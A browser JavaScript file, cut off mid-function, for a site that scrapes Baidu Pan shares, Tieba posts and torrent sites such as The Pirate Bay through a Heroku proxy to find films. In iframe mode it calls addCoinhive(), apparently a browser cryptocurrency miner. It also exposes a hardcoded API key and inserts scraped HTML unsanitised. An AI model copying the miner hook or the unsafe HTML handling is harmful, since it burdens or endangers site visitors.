window.onload = function(){
    
}
String.prototype.format = function()
{
    var args = arguments;
    return this.replace(/\{(\d+)\}/g,                
        function(m,i){
            return args[i];
        });
}
var config = {
//     nodeUrl:"http://127.0.0.1:8888/"
    nodeUrl:"//charon-node.herokuapp.com/"
    ,userLang:navigator.language || navigator.userLanguage
    ,key:getURLParameter("search")
    ,dataMin:screen.width>=1500?2:1
    ,bookmark:{
        "zh-CN":"收藏我,不然下次找不到哦"
        ,"default":"Bookmark me,if u have next time"
        ,string:function(){
            return this[config.userLang]||this.default;
        }
    }
    ,feedback:{
        "zh-CN":"<span>反馈意见?赏1分钱,支付宝留言.</span>"
        ,"default":"<span>Feedback?PayPal message.</span>"
        ,string:function(){
            return this[config.userLang]||this.default;
        }
    }
};

function setHeight(input,height){
        input.style.height = height;
}

function setFontSize(input,maxLength,fontSize){
    function min(x,y){
        return x-y<0?x:y;
    }
    function max(x,y){
        return x-y<0?y:x;
    }
    if(!fontSize){
        var fontSize = max(min(window.innerWidth,window.innerHeight)/maxLength,16)+"px";

    }
    input.style.fontSize = fontSize;
}

function changeHash(form){
    if(location.hash.substr(1)==form.search.value){
        Location.reload();
    }else{

        location.hash = "#"+form.search.value;
    }
    return false;
}
function locationParameterChanged() {
    var key = config.key;
    var input = document.getElementsByTagName("input")[0];

//     var submit = document.querySelector('[type="submit"]');
//     submit.onclick=function(e){

//         if(!input.value){
//             e.preventDefault();
            
//             input.focus();
//         }
//     }
    input.oninput = function(e){
            if(input.value){
                setDoubanSearch(input.value,function(){

                },"searchTop");

//                 loadGoogleEntitie(input.value);
            }else{
                setDoubanTop(undefined,true,function(){
//                     loadShare();
                });
            }
    }

    if(inIframe()){
        document.querySelector(".search-form").style.display = "none";
        document.querySelector("#searchBottom").style.display = "none";
        document.querySelector("#data").classList.add("iniframe");
    }else{
        input.onfocus = function(){

            setHeight(input,"50%");
    //          setFontSize(input,10);
        }
    }
    
    document.getElementsByTagName("form")[0].onsubmit = function(){
         setHeight(input,"15%");
//          setFontSize(input,100,"1.5em");
    }
    isDirect();
//     window.onclose = window.onunload= function(e){
//         if(isShowBookmark()){
//             e.preventDefault();
//             addBookmark();
//         }
//     } 
    if(!key){
        input.focus();
        input.setAttribute("required","required");
        var subjects = localStorage.getItem("doubanSearchs");
        
        if(subjects){
            subjects = JSON.parse(subjects);
            setDoubanSearchList(subjects,"searchTop",true);
//             loadShare();
        }
        
        setDoubanTop(undefined,true,function(){
            loadShare();
        });
//         syncIsIt().getAll();
        
        return;
    }

    input.value=key;
    document.getElementsByTagName("title")[0].innerText=key+" in pan.baidu.com sharing";
    setMessageForm(key);
    syncIsIt().getBykey();
    window.panc=pancFetcher(key);
    window.panduoduo=panduoduoFetcher(key);
    magnetFetcher(key);
    if(config.userLang=="zh-CN"){
         window.tieba=tiebaFetcher(key);
    }
    
    if(inIframe()){
        
        setDoubanSearch(input.value,function(){


            addCoinhive();

            addDonate();

        },"searchBottom");
        return;
    }
    setDoubanSearch(input.value,function(){
            
        loadShare(input.value);
        
    },"searchBottom");
    loadGoogleEntitie();

    if(isShowBookmark()){
        addBookmark();
    }
//     setMagnetTech();
}

function setMoreFetcher(button){
    button.style.display="none";
    var key = config.key;
    window.panduoduo=panduoduoFetcher(key);
    window.tieba=tiebaFetcher(key);
}
function setMessageForm(key){

    var sms = new String("有 {0} 吗？\r找到后发给我邮箱或手机\r：");
    var messageForm =  document.getElementById("messageForm");
    if(messageForm){
        messageForm.message.value = sms.format(key);
        messageForm.onsubmit=function(e){
            e.preventDefault();

            var submit = messageForm.querySelector('[type="submit"]')
            var tabMessage = document.getElementById("tab-message");

            submit.classList.add("loading");
//             var uri = "http://127.0.0.1:8888/cross";
            var uri = config.nodeUrl+"cross"
            var method = messageForm.method;
            var data = {
                "crossUrl":messageForm.action
                ,"crossMethod":method
                ,"message":messageForm.message.value
            }
            var fn = function(data){
                console.log(data+messageForm.action);
                tabMessage.click();
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("success");
            }
            var error = function(){
                submit.classList=[];
                tabMessage.classList=[];
                tabMessage.classList.add("error");
            }

            ajax(uri,fn,error,method,JSON.stringify(data));

            return false;
        }
    }
}
function loading(is,id){           
    var loadingDoc = document.getElementById(id?id:"pancLoading");
    loadingDoc.style.display=is?"block":"none";
}


function ShowMore(){

    var length = window.showVideos.length;
    var ways = [panc,tieba,magnet,panduoduo];

//     var ways = [panduoduo];
    if(length<1){
        length = 1;
    }
    setMoreIframe(ways,0,length);

    
}
function setMoreIframe(ways,index,length){
    if(!index){
        index = 0;
    }
    if(!ways[index]){
        confirm("noneTemplate",true);
        return;
    }
    var videos = ways[index].videos;
    var than = length - videos.length;

    if(videos.length == 0){
        setMoreIframe(ways,index+1,than);
    }else if(than>0){
        ways[index].setIframe(videos,videos.length,window.showVideos,true);
        setMoreIframe(ways,index+1,than);
    }else{
        ways[index].setIframe(videos,length,window.showVideos,true);
    }

}
function fetcher(parameter){
    var serf = {};
    serf.dataMin = config.dataMin||1;
    serf.host = parameter.host;
    serf.videos = [];
    serf.fetchUrl = parameter.fetchUrl;
    serf.parseVideos = parameter.parseVideos;
    serf.setIframe = function (videos,length,showVideos,doNotCheckInvalid){
        
        if(parameter.setIframe){
            parameter.setIframe(videos,length,showVideos,doNotCheckInvalid,serf);
        }else{
            var videos = videos.splice(0,length);
            videos.map(function(video,index){
                var success = function(){
                    setIframe(video,index==0);
                    showVideos.push(video);
                };
                if(doNotCheckInvalid){

                    success();
                }else{
                    serf.checkInvalid(video,function(){
                        if(index>=videos.length-1){
                            serf.setIframe(serf.videos,1,showVideos);
                        }
                    },success);
                }
            });
            
        }

        serf.progress.setNum(serf.videos.length);
    }

    serf.checkInvalid = function(video,error,success){
        if(parameter.checkInvalid){
            var uri = config.nodeUrl+"cross?api="+video.url;
            ajax(uri,function(data){
                var index = data.indexOf("百度网盘-链接不存在");

                if(index<0){
                    success();
                }else{
                    error();
                }
                data=null;
            },error);
        }else{
            success();
        }
    }
    serf.onLoaded=function(){
        if(parameter.onLoaded){
            parameter.onLoaded(serf);
        }else{

            serf.setIframe(serf.videos,serf.dataMin,window.showVideos);
        }
    }
    serf.fetch = parameter.fetch;
    serf.load = function (){
        serf.progress = innerProgress(serf.host,serf.fetchUrl);
        var success = function(html){
            var progress = serf.progress;
            var videos = serf.parseVideos(html);
            if(!videos||videos.length===0){
                progress.none();
//                 confirm("noneTemplate");
                return;
            }
            progress.success(videos.length);
            serf.videos = videos;
            if(!window.showVideos){
                window.showVideos = [];
            }
            serf.onLoaded();
            html = null;

        };
        serf.fetch(serf.host,serf.fetchUrl,success);
        return serf;
    }
    
    return serf.load();
}

function panduoduoFetcher(key){
    var parameter = {};
    parameter.host = "panduoduo";
    parameter.fetchUrl = "http://www.panduoduo.net/s/comb/n-"+key+"&ty-bd&f-f4";
    parameter.fetch = fetch;
    parameter.parseVideos = function(html){
        return parseList(html,".search-page .row");
        function parseList(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;

            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                if(videos.length>10){
                    break;
                }
                var img = as[i].querySelector('[title="百度云盘资源"]');
                var type = as[i].querySelector('[href^="/c/"]');
                if(img&&type.innerHTML=="视频"){
                    var a = as[i].querySelector("a[href^='/r/']");
                    var video = {ref:parameter.host,name:a.innerHTML,url:"http://www.panduoduo.net"+a.pathname};
                    videos.push(video);
                }

    //                 fetchDetal(video,i===0);

            }
            html = el = els = null;
            return videos;
        }

    }
    parameter.onLoaded = function(fetcher){

//         fetcher.setIframe(fetcher.videos,1,window.showVideos);
//         clearInvalid(fetcher,function(video){
//             fetcher.setIframe([video],1,window.showVideos);
//             fetcher.progress.setNum(fetcher.videos.length);

//         });
    }
    parameter.setIframe = function (panduoduoVideos,length,showVideos){
        var videos = panduoduoVideos.splice(0,length);
        videos.forEach(function (item, index, array) {

            showVideos.push(item);
            fetchDetal(item,index===0);
        });
        
        function fetchDetal(video,isSrc){
            
            var wrapper = setIframe(video,false,true);
            var success = function(html){

                var url = parseDetail(html,"a.dbutton2");
                if(!url){
                    parameter.setIframe(videos,1,window.showVideos);

                }
                if(window.showVideos&&isExist(url,window.showVideos)){
                    return;
                }
                video["url"] = url;
                function parseDetail(html,select){
                    var urlIndex = html.indexOf('"dbutton2" href="')+'"dbutton2" href="'.length;
                    var href = html.substring(urlIndex,html.indexOf('"',urlIndex));
//                     var url = getURLParameter("url",href);
                    return href;
                }
                url = config.nodeUrl+"cross?api="+url;
                setIframeUrl(url,wrapper,isSrc);


            }
            fetch("panduoduo",video.url,success);
        }
//         function fetchGo(video,isSrc){
//             fetch("panduoduo",video.url,success);
//         }
    }
    
    return fetcher(parameter);
    
}


function pancFetcher(key){

    var parameter = {};
    parameter.host = "panc";
    parameter.fetchUrl = "https://www.panc.cc/s/"+key+"/td";
    parameter.fetch = nodeFetch;
    parameter.onLoaded = function(fetcher){

        fetcher.setIframe(fetcher.videos,fetcher.dataMin,window.showVideos);
        clearInvalid(fetcher,function(video){
            fetcher.setIframe([video],1,window.showVideos);
            fetcher.progress.setNum(fetcher.videos.length);

        });
    }
    parameter.setIframe = function (videos,length,showVideos,doNotCheckInvalid,fetcher){
        var videos = videos.splice(0,length);
        videos.map(function(video,index){
            if(!checkExistUk(video,showVideos)){
                setIframe(video,index==0);
                showVideos.push(video);
            }else{
                
                videos.splice(videos.indexOf(video), 1);
                fetcher.progress.setNum(fetcher.videos.length);
//                 parameter.setIframe(videos,1,showVideos);
            }
        });
        videos = null;
    }

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".a_url");
        

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                videos.push({name:as[i].previousElementSibling.innerHTML,url:as[i].href});
            }
            return videos;
        }
        return videos;
    }
//     parameter.checkInvalid = true;
    
    
    return fetcher(parameter);

}

function fetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI(config.nodeUrl+"fetch?api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function nodeFetch(host,api,success){

//     confirm("loadingTemplate");
    var url = encodeURI(config.nodeUrl+"fetch?npm=node-fetch&api="+api);
//     var url = encodeURI("http://127.0.0.1:8888/fetch?npm=node-fetch&api="+api);
//     var data = JSON.stringify({crossUrl:api});
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}
function cross(host,api,success){

//     confirm("loadingTemplate");
//     var url = encodeURI("http://127.0.0.1:8888/cross?api="+api);

    var url = encodeURI(config.nodeUrl+"cross?api="+api);
    try{
        var error = function(){
            var videos = [];
//             confirm("noneTemplate");
            progress(host).error();
//             setIframe(videos,true,true);
        }
        ajax(url,success,error);

    }catch(e){
        error();
    }
}



// function setIframe(videos,isSrc,waitUrl,templateId) {
    
//     templateId = templateId?templateId:"videoTemplate";
//     var template = document.getElementById(templateId).innerHTML;

//     var dataBox =  document.getElementById("data");
//     for(var i=0;i<videos.length;i++){
// //         if(window.showVideos&&isExist(videos[i],window.showVideos)){
// //             continue;
// //         }
//         var wrapper= document.createElement('div');
//         wrapper.innerHTML= template;
//         a = wrapper.children[0];
//         a.innerHTML=videos[i].name;
//         var url = videos[i].url;
//         a.href=videos[i].refUrl||url;
//         if(!waitUrl){
//             if(templateId=="videoTemplate"){
//                 var index = url.indexOf("//");
//                 url = url.substr(index>=0?index:0);
//             }
//             setIframeUrl(url,wrapper,isSrc&&i==0,templateId);
        
//         }

        
//         dataBox.appendChild(wrapper);
//     }
//     confirm("");
//     dataBox = iframe = videos = null;
//     return wrapper;
// }
function setIframe(video,isSrc,waitUrl,templateId,dataBoxId){
    if(video.ref&&video.ref=="magnet"){
        templateId = "magnetTemplate"
    }
    templateId = templateId?templateId:"videoTemplate";
    var template = document.getElementById(templateId).innerHTML;

    var dataBox =  document.getElementById(dataBoxId||"data");
    var wrapper= document.createElement('div');
    wrapper.classList.add("video-item")
    wrapper.innerHTML= template;
    var a = wrapper.children[0];
    var url = video.url;
    if(video.key&&!config.key){
        a.href="?search="+video.key;
        a.innerHTML=video.key;
        a.target = "";
    }else{
        a.innerHTML=video.name;
        a.href=video.refUrl||url;
    }

    if(templateId=="videoTemplate"){
        var index = url.indexOf("//");
        url = url.substr(index>=0?index:0);
    }
    var isIt =  wrapper.querySelector("[name='isIt']");
    isIt.value = JSON.stringify(video);
    if(isItTrue(isIt)||video.key){
        isIt.checked = true;
    }
    var key = video.key||config.key;
    isIt.title="Is this "+key+"?"
    isIt.dataset.key= key;

    if(dataBox.querySelector("iframe[data-src='"+url+"']")||dataBox.querySelector("a[href='"+url+"']")){
                
    }else{
        dataBox.appendChild(wrapper);
    }
    if(!waitUrl){
        setIframeUrl(url,wrapper,isSrc,templateId);

    }

        
//     confirm("");
    dataBox = iframe = null;
    return wrapper;
}
function setIframeUrl(url,wrapper,isSrc,templateId){

    if(!url){
        wrapper.removeChild(iframe);
    }else{

        templateId = templateId?templateId:"videoTemplate";
        if(templateId=="videoTemplate"){
            var iframe = wrapper.querySelector("iframe");
            if(isDisableScript(url)){
                iframe.sandbox="allow-same-origin allow-popups allow-forms allow-pointer-lock";
            }
            iframe.dataset.src=url;
            if(isSrc){
                iframe.src=url;
            }
            addVideosHandler(iframe);


        }else if(templateId=="magnetTemplate"){

            var code= wrapper.querySelector("code");;
            code.innerHTML = url;
        }
    }

}
function isExist(url,videos,key){
    for(var i=0;i<videos.length;i++){
        var key = key || "url";
        if(videos[i][key]==url){
            return true;
        }
    }
    return false;
}
function isDisableScript(url){
    if(url.indexOf("pan.baidu.com/pcloud/album/file")>0){
        return true;
    }
    return false;
}

function load(uri,fn){
    var request = new XMLHttpRequest();
    request.open('PUT', uri, false); 
    request.send(null);
    if (request.status === 200) {
      return request.responseText;
    }
}

function getURLParameter(name,url) {
  return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(url?url:location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
}


function isElementInViewport (el) {

    //special bonus for those using jQuery
    if (typeof jQuery === "function" && el instanceof jQuery) {
        el = el[0];
    }

    var rect = el.getBoundingClientRect();

    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) && /*or $(window).height() */
        rect.right <= (window.innerWidth || document.documentElement.clientWidth) /*or $(window).width() */
    );
}
function onVisibilityChange(el, callback) {
    var old_visible;
    return function () {
        var visible = isElementInViewport(el);
        if (visible != old_visible) {
            old_visible = visible;
            if (typeof callback == 'function') {
                callback();
            }
        }
    }
}
function addVideosHandler(iframe){
    var handler = onVisibilityChange(iframe, function() {
        if(!iframe.src){
            iframe.src = iframe.dataset.src;
        }
    });
    if (window.addEventListener) {
        addEventListener('DOMContentLoaded', handler, false); 
        addEventListener('load', handler, false); 
        addEventListener('scroll', handler, false); 
        addEventListener('resize', handler, false); 
    } else if (window.attachEvent)  {
        attachEvent('onDOMContentLoaded', handler); // IE9+ :(
        attachEvent('onload', handler);
        attachEvent('onscroll', handler);
        attachEvent('onresize', handler);
    }
}

function ajax(uri,fn,error,method,data,contentType){
    var request = new XMLHttpRequest();
    request.open(method||"GET", uri);
    request.setRequestHeader("Content-Type", contentType||"text/plain;charset=UTF-8");

    try{
      request.send(data||null);
    }catch(e){
        error();
    }
    request.onload = function(e) {
        if (this.status == 200) {
                fn(this.response,error);
//             try{
//             }catch(e){
//                 error();
//             }
        }else{
          error();
        }
    };
    request.onerror = error;
//     request.timeout = 20000; // time in milliseconds
//     request.ontimeout = function (e) {
//       // XMLHttpRequest timed out. Do something here.
//       request.abort();
//       error();
//     };
    return request;
}

function isEnglish(string){
    var notEnglish = /[^\x00-\x7F]+/;
    if (notEnglish.test(string)){
        return false;
    }
    return true;
}

function magnetFetcher(key){
    var parameter = {};

    if(isEnglish(key)){
//         return null;
//     }
        parameter.host = "thepiratebay";
        parameter.fetchUrl = "https://thepiratebay.org/search/"+key+"/0/99/0";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll("#searchResult tbody tr");
                
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector(".detLink").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    videos.push(video);
        //                 fetchDetal(video,i===0);

                }
                html = el = els = null;
                return videos;
            }
        };

        parameter.fetch = cross;
        parameter.onLoaded = function(fetcher){
            fetcher.setIframe(fetcher.videos,fetcher.dataMin*2,window.showVideos);
        }
    }else{
        parameter.host = "diaosisou";
        parameter.fetchUrl = "http://www.diaosisou.org/list/"+key+"/1";
        parameter.parseVideos = function(html){
            var videos = parseList(html);
            return videos;

            function parseList(html){

                var videos = [];
                var el = document.createElement( 'html' );
                el.innerHTML = html;

                var els = el.querySelectorAll(".mlist>li");
                el = null;
                for(var i = 0;i<els.length;i++){
        //             if(i>10){
        //                 break;
        //             }
                    var name = els[i].querySelector("a[name='file_title'").innerHTML;
                    var url = els[i].querySelector("a[href^='magnet:']").href;
                    var video = {ref:"magnet",name:name,url:url};
                    var func = video.name.length<70?"unshift":"push";
                    videos[func](video);
        //                 fetchDetal(video,i===0);

                }
                
                html = el = els = null;
                return videos;
            }
        };
        parameter.fetch = nodeFetch;
        parameter.onLoaded = function(fetcher){
            if(fetcher.videos[0].name.length<70){
                fetcher.setIframe(fetcher.videos,1,window.showVideos);
            }
        }
    }
    

//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,true,false,"magnetTemplate");
//         });
//     }
    
    window[parameter.host] = fetcher(parameter);


    
}

function loadError (oError) {
     console.log("The script " + oError.target.src + " is not accessible.");

//   throw new URIError("The script " + oError.target.src + " is not accessible.");
}

function importScript (sSrc, fOnload) {
  var oScript = document.createElement("script");
  oScript.type = "text\/javascript";
  oScript.onerror = loadError;
  if (fOnload) { oScript.onload = fOnload; }
  if( document.currentScript){
        document.currentScript.parentNode.insertBefore(oScript, document.currentScript);

  }else{
      document.body.appendChild(oScript);
  }
  oScript.src = sSrc;
  oScript.abort = ()=>{
    return trigger(oScript,'error');
  };
  return oScript;


  
}
//[trigger 触发事件]
function trigger(element,event){
  if( !typeof event == "string" ) {
    return;
  }
  if ( element.dispatchEvent ){
    let evt = document.createEvent('Events');// initEvent接受3个参数
    evt.initEvent(event, true, true);
    element.dispatchEvent(evt);
  }else if ( element.fireEvent ){ //IE
    element.fireEvent('on'+event);
  }else{
    element['on'+event]();
  }
}
function progress(host){

    var _progress = document.getElementById(host+'Progress');
    if(_progress.interval){
        return _progress;
    }
    _progress.init = function(){

        _progress.parentNode.parentNode.classList=[];
        _progress.value = 0;
        _progress.interval=setInterval(frame, 10);
    }
//     _progress.is_progress = true;
    _progress.success=function(length){

        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("success");
        clearInterval(_progress.interval);
        if(length){
           _progress.nextSibling.innerHTML = "<em>"+length+"</em>";
        }
    };
    _progress.setNum=function(length){
        if(length>0){
            _progress.success(length);
        }else{
            _progress.none();
        }
    }
    _progress.none = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("none");
        clearInterval(_progress.interval);
        _progress.nextSibling.innerHTML = "<em>"+0+"</em>";
    }
    _progress.error = function(){
        _progress.parentNode.parentNode.classList=[];
        _progress.parentNode.parentNode.classList.add("error");
        clearInterval(_progress.interval);
    }
    _progress.parentNode.onclick=function(){
        var fetcher = window[host];
        if(fetcher&&fetcher.videos.length){
            var length = fetcher.videos.length;
            var showLength = showVideos.length;
            length = length>showLength?showLength:length;
            if(host=="panduoduo"){
                length = 1;
            }
            setMoreIframe([fetcher],0,length);
        }
    }
    _progress.nextSibling.nextSibling.onclick=function(){
        var fetcher = window[host];
        if(fetcher){
            fetcher.load();
        }
    }
    function frame() {
        if (_progress.value >= 20000) {
            clearInterval(_progress.interval);
            _progress.error();
        } else {
            _progress.value  = _progress.value + 10;
        }
    }
    return _progress;
}

function innerProgress(host,fetchUrl){
    var progressGroup = document.getElementById("progressGroup");
    progressGroup.classList.add("show");
    var  progressD= document.getElementById(host+"Progress");
    if(!progressD){
        var html = '<li><a target="_blank" href="'+fetchUrl+'" title="'+host+'"><i class="'+host+'"></i></a><span class="more" href="javascript:return void()"><progress max="20000" id="'+host+'Progress"></progress><span class="num"></span><span class="reloadSingle" title="Reload"></span></span>';
        var child = progressGroup.querySelector("li.more");
        beforeHTML(progressGroup,html,child);
    }
    var _progress  = progress(host);

    _progress.init();
    return _progress;
}
function appendHTML(d,html){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.appendChild(wrapper.children[0]);
}
function beforeHTML(d,html,child){
    var wrapper= document.createElement('div');
        wrapper.innerHTML= html;
        d.insertBefore(wrapper.children[0],child);
}

// function changeShowVideosNeedCheck(video,url){
//     if(!url){
//         showVideos.push(video);
//     }else{
//         video["url"]=url;
//     }
//     check(video["url"],function(){
//         showVideos = showVideos.splice(video, 1);
//     })
// }
function checkInvalid(url,error,success){

    var uri = config.nodeUrl+"cross?api="+url;
    ajax(uri,function(data){
        var index = data.indexOf("百度网盘-链接不存在");
        
        if(index<0){
            success();
        }else{
            error();
        }
        data=null;
    },error);
}
function clearInvalid(fetcher,successOne){
    try{
        var array = fetcher.videos;
        array.map(function(o) { 
    
            var isSortUrl =function(url){
                var index = url.indexOf("pan.baidu.com/s/");
                return index>=0?true:false;
            }
            if(!isSortUrl(o["url"])){
                checkInvalid(o["url"],function(){
                    array.splice(array.indexOf(o), 1);
                    fetcher.progress.setNum(array.length);
                },function(){
                    if(successOne){
                        successOne(o);
                        successOne = false;
                    }
                })
            }
        });
    }catch(e){

    }
    

}

function setDoubanList(value){
    var api = "https://api.douban.com/v2/movie/search?q="+value;
    var uri = config.nodeUrl+"cross?api="+api;
    ajax(uri,function(data){
        var html  = "";
        var subjects = JSON.parse(data).subjects;
        for(var i = 0;i<3&&i<subjects.length;i++){
            html += searchToHtml(subjects[i].original_title,subjects[i].images.medium);
            if(i<1&&subjects[i].original_title!=subjects[i].title){
                html += searchToHtml(subjects[i].title,subjects[i].images.medium);

            }
        }
        var doubanListD = document.getElementById("doubanList");
        doubanListD.innerHTML=html;
        doubanListD.style.display = "block";
        data=html=subjects=doubanListD=null;
    });
}
function setDoubanSearch(value,success,id){

    var value = value||config.key;
    if(!value){
        return;
    }
    window.doubanListId = id;
//     if(doubanListD.innerHTML){
//         return;
//     }
    if(window.doubanRequest){
        window.doubanRequest.abort();
    }
    if(id!="searchBottom"){
        var api = "https://api.douban.com/v2/movie/search?callback=setDoubanSearchCallback&q="+value;
        window.doubanRequest = importScript(api,success);  
    }else{
        var api = "https://api.douban.com/v2/movie/search?q="+value;
        var uri = config.nodeUrl+"cross?api="+api;
        window.doubanRequest = ajax(uri,function(data){

            var subjects = JSON.parse(data).subjects;
            if(subjects){
                setDoubanSearchList(subjects,id);
                var searchs = JSON.parse(localStorage.getItem("doubanSearchs"))||[];
                if(!isExist(subjects[0].title,searchs,"title")){
                    searchs.unshift(subjects[0]);
                    searchs = JSON.stringify(searchs);
                    localStorage.setItem("doubanSearchs",searchs);
                }
                searchs=subjects=data=null;
            }

            success();
        });
    }  

}
function setDoubanSearchCallback(data){
    var subjects = data.subjects;
    if(subjects){
        setDoubanSearchList(subjects,window.doubanListId);
        var searchs = JSON.parse(localStorage.getItem("doubanSearchs"))||[];
        if(!isExist(subjects[0].title,searchs,"title")){
            searchs.unshift(subjects[0]);
            searchs = JSON.stringify(searchs);
            localStorage.setItem("doubanSearchs",searchs);
        }
        searchs=data=null;
    }
}
function setDoubanSearchList(subjects,id,islocal){
        var doubanListD = document.getElementById(id)||document.querySelector(".doubanList");

        var html  = "";
        for(
            var i = 0;
            islocal?(i<50&&i<subjects.length):(i<5&&i<subjects.length);
            i++
        ){
            var title1 = (config.userLang=="zh-CN")?subjects[i].title:subjects[i].original_title;
            var title2 = (config.userLang=="zh-CN")?subjects[i].original_title:subjects[i].title;
            html += searchToHtml(title1,subjects[i].images.medium);
            if(i<1&&title1!=title2&&!islocal){
                html += searchToHtml(title2,subjects[i].images.medium);

            }
        }
        if(true&&!islocal){
                    html += '<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';

        }

        doubanListD.classList.add("doubanList");
        doubanListD.innerHTML=html;
        html=null;
}
function searchToHtml(title,image){
    var isSame = "";
    if(config.key!=title){
        isSame = 'href="?search='+encodeURIComponent(title)+'"';

    }
    var imgHtml = "";
    if(image){
        imgHtml = '<img src="'+image+'"/>';
    }
    return '<a '+isSame+' >'+imgHtml+'<span>'+title+'<span></a>';
    
}
function setDoubanTop(tab,isLazy,success){
    
//     if(doubanListD.innerHTML){
//         return;
//     }
    if(window.doubanRequest){
        window.doubanRequest.abort();
    }


    var random = parseInt(Math.random()*230);
    var api = "https://api.douban.com/v2/movie/top250?apikey=0df993c66c0c636e29ecbb5344252a4a&start="+random+"&&callback=setDoubanTopCallback";
    window.doubanRequest = importScript(api,success);

//     var uri = config.nodeUrl+"cross?api="+api;
//     window.doubanRequest = ajax(uri,function(data){
//         var html  = "";
//         var subjects = JSON.parse(data).subjects;
//         var value = config.key;
//         for(var i = 0;i<subjects.length;i++){
//             var subject = subjects[i];

//             var title = (config.userLang=="zh-CN")?subjects[i].title:subjects[i].original_title;
//             html += searchToHtml(title,subjects[i].images.medium);
            
//         }
// //         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more icon-douban">Top 250<i>﹀</i></a>';
//         html += '<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';
//         doubanListD.innerHTML+=html;
//         doubanListD.classList.add("doubanList");
//         data=html=subjects=doubanListD=null;
//         success();
//     });
}

function setDoubanTopCallback(data){
    var html  = "";
    var subjects = data.subjects;
    var value = config.key;
    for(var i = 0;i<subjects.length;i++){
        var subject = subjects[i];

        var title = (config.userLang=="zh-CN")?subjects[i].title:subjects[i].original_title;
        html += searchToHtml(title,subjects[i].images.medium);

    }
//         html += '<a target="_blank" href="https://movie.douban.com/top250" class="douban-more icon-douban">Top 250<i>﹀</i></a>';
    html += '<a target="_blank" href="https://movie.douban.com/annual/2017" class="movieannual2017"></a>';
    var doubanListD = document.getElementById("searchTop")||document.querySelector(".doubanList");
    doubanListD.innerHTML+=html;
    doubanListD.classList.add("doubanList");
    data=html=subjects=doubanListD=null;
}

function setMagnetTech(tab){
    if(!tab){
        var tab = document.getElementById("tab-Magnet");
//         tab.checked = true;
        tab.parentNode.style.display="inline-block";
        return;

    }else if(!tab||tab.checked == false){
        return;
    }
    setOtherClose(tab);
    var contentD = tab.nextElementSibling.nextElementSibling;
    contentD.innerHTML = document.getElementById("magnetTechTemplate").innerHTML;
}

function reloadIframe(button){
    button.previousElementSibling.src=button.previousElementSibling.src
}



function tiebaFetcher(key){

    var parameter = {};
    parameter.host = "tieba";
    parameter.fetchUrl = "http://tieba.baidu.com/f/search/res?ie=utf-8&qw="+key+" pan.baidu";
    parameter.fetch = cross;

    parameter.parseVideos = function(html){
        var videos = parseHref(html,".s_post");
//         clearInvalid(videos);
        return videos;

        function parseHref(html,select){
            var videos = [];
            var el = document.createElement( 'html' );
            el.innerHTML = html;
            var as = el.querySelectorAll(select);
            for(var i = 0;i<as.length;i++){
                var p_title = as[i].querySelector(".p_title").innerHTML;
                var refUrlIndex = p_title.indexOf('href="')+6;
                var refUrlEnd = p_title.indexOf('"',refUrlIndex);
                var refUrl = p_title.substring(refUrlIndex,refUrlEnd)
                var html = p_title+as[i].querySelector(".p_content").innerHTML;
                
                var key = getkey(html);
                var string = as[i].querySelector(".p_title").innerText+" "+as[i].querySelector(".p_content").innerText;
                var keyIndex = string.lastIndexOf(key);
                var name = string.slice(keyIndex);
                var url = getUrl(string,keyIndex);
                
                if(key&&check(url)){
                    videos.push({name:string,url:url,refUrl:"http://tieba.baidu.com"+refUrl});
                }

            }
            return videos;
            function check(url){
                if(!url){
                    return false;
                }
                if(url.indexOf("pan.baidu.com/mbox")>0){
                    return false;
                }
                return true;
            }
            function getUrl(string,keyIndex){
                var keyIndex2 = keyIndex?keyIndex:0;
                var urlIndex = string.indexOf("http",keyIndex2);
                if(urlIndex>=0){
                    var url = string.slice(urlIndex);
                    var regexp = /[^\x00-\x7F]|\s|\.\.\.|,/;
                    var match = url.match(regexp);
                    url = url.slice(0,match.index);
                    return url;
                }else{
                    if(keyIndex){
                        return getUrl(string);
                    }
                }
                return "";
            }
            function getkey(html){
                var wrapper= document.createElement('div');
                wrapper.innerHTML= html;
                var ems = wrapper.querySelectorAll("em");
                for(var i = ems.length-1;i>=0;i--){
                    if(ems[i].innerText!="pan.baidu"){
                        return ems[i].innerText;
                    }
                }
                return "";
            }
        }
    }
//     parameter.setIframe = function (videos,length,showVideos){
//         var videos = videos.splice(0,length);
//         window.showVideos = window.showVideos.concat(videos);
//         videos.map(function(video,index){
//             setIframe(video,index==0,false);
//         });
//     }
    
    return fetcher(parameter);

}


function checkExistUk(video,videos){
    try{
